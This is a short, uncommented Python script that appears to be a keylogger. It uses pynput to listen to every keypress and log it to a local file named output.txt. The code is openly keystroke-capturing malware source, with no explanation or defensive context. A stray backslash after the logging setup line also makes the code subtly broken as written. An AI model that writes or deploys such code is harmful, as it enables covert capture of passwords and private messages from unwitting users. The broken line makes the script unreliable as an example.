from pynput.keyboard import Key, Listener
import logging
logging.basicConfig(filename='output.txt', filemode='w', level=logging.INFO, format='%(message)s')\
def on_press(key):
    logging.info('{0}'.format(key))
with Listener(on_press) as listener:
    listener.join()